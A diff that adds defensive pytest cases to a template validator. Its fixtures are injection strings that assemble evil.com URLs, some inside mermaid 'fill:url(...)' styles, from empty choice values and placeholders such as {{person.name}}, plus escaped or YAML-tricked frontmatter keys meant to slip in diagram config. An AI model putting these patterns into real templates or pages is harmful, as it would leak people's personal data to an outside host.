@@ -1298,3 +1298,75 @@ def test_llm_error_text_is_not_returned_verbatim(monkeypatch):
     with pytest.raises(GenerateError) as e:
         run_turn("p", turn_key="k")
     assert str(e.value) == generate.PROVIDER_FAILED
+
+
+# ── Final fix amendment ───────────────────────────────────────────────────
+
+
+def _one_on_one_choice(options: str, body: str) -> str:
+    choice = f"    - id: c\n      ask: Which?\n      type: choice\n      options: {options}\n"
+    draft = _one_on_one(body).replace("      optional: true\n", "      optional: true\n" + choice, 1)
+    assert "id: c" in draft
+    return draft
+
+
+@pytest.mark.parametrize(
+    ("options", "body"),
+    [
+        ("[x, ww]", "See {{c}}{{user.name}}w.evil.com/{{person.name}}/{{focus}}"),
+        ("[x, ww]", "See {{c}}{{focus}}w.evil.com/{{person.name}}"),
+        ("[x, ht]", "```mermaid\nflowchart TD\nA-->B\nstyle A fill:url({{user.name}}{{c}}tps:evil.com/{{person.name}})\n```"),
+        ("[x, /]", "```mermaid\nflowchart TD\nA-->B\nstyle A fill:url({{c}}{{user.name}}/evil.com/{{person.name}})\n```"),
+    ],
+)
+def test_a_choice_option_next_to_an_empty_value_cannot_build_a_url(options, body):
+    assert url_problems(_one_on_one_choice(options, body))
+
+
+def test_a_choice_template_with_empty_values_and_slashes_still_passes():
+    assert check_draft(_one_on_one_choice(
+        "[weekly, monthly]", "Filed under {{c}}/{{person.name}}, owner {{user.name}}/{{c}}.")).ok
+
+
+@pytest.mark.parametrize(
+    "front",
+    [
+        '"\\x63onfig": {theme: dark}',
+        '"\\u0063onfig": {theme: dark}',
+        '"config": {theme: dark}',
+        "? !!str config\n: {theme: dark}",
+        "Config: {theme: dark}",
+        "title: x\nlook: handDrawn",
+        "title: [unclosed",
+        "- not a mapping",
+    ],
+)
+def test_mermaid_frontmatter_holds_only_a_title(front):
+    body = f"```mermaid\n---\n{front}\n---\ngraph TD\nA-->B\n```"
+    problems = forbidden(GOOD.replace("## Blockers", body))
+    assert any("diagram" in d.message for d in problems)
+
+
+def test_mermaid_frontmatter_never_closed_is_rejected():
+    forbidden(GOOD.replace("## Blockers", "```mermaid\n---\ntitle: x\ngraph TD\n```"))
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "```mermaid\n---\ntitle: Flow\n---\ngraph TD\nA-->B\n```",
+        "```mermaid\n---\ntitle: \"{{team}} flow\"\n---\ngraph TD\nA-->B\n```",
+        "- ```mermaid\n  ---\n  title: Flow\n  ---\n  graph TD\n  ```",
+        "```mermaid\ngraph TD\nA-->B\n```\n\n---\n\nAfter the diagram.",
+    ],
+)
+def test_mermaid_title_frontmatter_still_passes(body):
+    assert check_draft(GOOD.replace("## Blockers", body)).ok
+
+
+def test_draft_rules_documents_its_layer():
+    from ghostbrain.templates import draft_rules
+
+    doc = draft_rules.__doc__
+    assert "layer 1" in doc and "CSP" in doc and "layer 2" in doc and "B3" in doc
+    assert "layer 3" in doc and "90-meta/templates" in doc
